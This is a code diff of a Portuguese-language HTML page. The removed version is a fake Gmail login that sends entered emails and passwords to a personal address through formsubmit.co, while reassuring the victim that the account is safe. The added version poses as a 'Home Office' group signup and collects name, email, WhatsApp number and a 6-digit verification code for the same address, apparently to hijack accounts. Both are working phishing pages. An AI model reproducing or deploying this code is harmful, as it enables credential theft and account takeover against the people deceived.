@@ -3,111 +3,96 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login Simulado - Gmail</title>
+  <title>Cadastro Home Office</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to right, #4facfe, #00f2fe);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      padding: 20px;
     }
-    .form-box, .success-box {
-      background-color: #fff;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-      width: 100%;
+    .box {
+      background: #fff;
+      padding: 25px;
       max-width: 400px;
-      text-align: center;
-      display: none;
+      margin: 40px auto;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
-    .active {
-      display: block;
-    }
-    .logo {
-      width: 90px;
-      margin-bottom: 30px;
-    }
-    input {
+    input, button {
       width: 100%;
-      padding: 14px;
-      margin: 10px 0 20px;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 8px;
       border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 15px;
     }
     button {
-      width: 100%;
-      padding: 14px;
-      background: #1a73e8;
+      background: #007bff;
+      color: #fff;
       border: none;
-      border-radius: 6px;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
       cursor: pointer;
     }
-    .footer {
-      font-size: 13px;
-      color: #777;
-      margin-top: 20px;
-    }
-    .success-box h2 {
-      color: #4CAF50;
-      margin-bottom: 20px;
-    }
-    .success-box p {
-      font-size: 16px;
-      color: #555;
+    button:hover {
+      background: #0056b3;
     }
   </style>
 </head>
 <body>
 
-  <!-- Tela do formulário -->
-  <div class="form-box active" id="formulario">
-    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Logo Gmail" class="logo">
-    <form id="loginForm">
-      <input type="email" name="email" placeholder="Digite seu e-mail" required />
-      <input type="password" name="senha" placeholder="Digite sua senha" required />
-      <input type="hidden" name="_captcha" value="false">
+  <!-- Etapa 1 -->
+  <div class="box" id="etapa1">
+    <h2>Participe do grupo de Home Office</h2>
+    <form id="formEtapa1">
+      <input type="text" name="nome" placeholder="Seu nome" required>
+      <input type="email" name="email" placeholder="Seu e-mail" required>
+      <input type="text" name="whatsapp" placeholder="Número do WhatsApp" required>
       <button type="submit">Avançar</button>
     </form>
-    <div class="footer">Simulação visual para estudos.</div>
   </div>
 
-  <!-- Tela de sucesso -->
-  <div class="success-box" id="sucesso">
-    <h2>Sua conta está segura</h2>
-    <p>Nenhuma atividade suspeita foi detectada.<br>Obrigado por verificar suas informações.</p>
+  <!-- Etapa 2 -->
+  <div class="box" id="etapa2" style="display:none">
+    <h2>Confirme sua participação</h2>
+    <form id="formEtapa2">
+      <input type="text" name="codigo" placeholder="Digite o código de 6 dígitos" maxlength="6" required>
+      <button type="submit">Finalizar</button>
+    </form>
+  </div>
+
+  <!-- Mensagem final -->
+  <div class="box" id="final" style="display:none">
+    <h2>Obrigado!</h2>
+    <p>Você concluiu o cadastro.</p>
   </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    const etapa1 = document.getElementById("etapa1");
+    const etapa2 = document.getElementById("etapa2");
+    const final = document.getElementById("final");
+
+    // Envio da etapa 1
+    document.getElementById("formEtapa1").addEventListener("submit", function(e) {
       e.preventDefault();
-
-      const formData = new FormData(this);
-
       fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
         method: "POST",
-        body: formData,
+        body: new FormData(this),
         headers: { 'Accept': 'application/json' }
-      }).then(response => {
-        if (response.ok) {
-          document.getElementById("formulario").classList.remove("active");
-          document.getElementById("sucesso").classList.add("active");
-        } else {
-          alert("Erro ao enviar. Tente novamente.");
-        }
-      }).catch(() => {
-        alert("Erro de conexão.");
+      }).then(() => {
+        etapa1.style.display = "none";
+        etapa2.style.display = "block";
+      });
+    });
+
+    // Envio da etapa 2
+    document.getElementById("formEtapa2").addEventListener("submit", function(e) {
+      e.preventDefault();
+      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        body: new FormData(this),
+        headers: { 'Accept': 'application/json' }
+      }).then(() => {
+        etapa2.style.display = "none";
+        final.style.display = "block";
       });
     });
   </script>
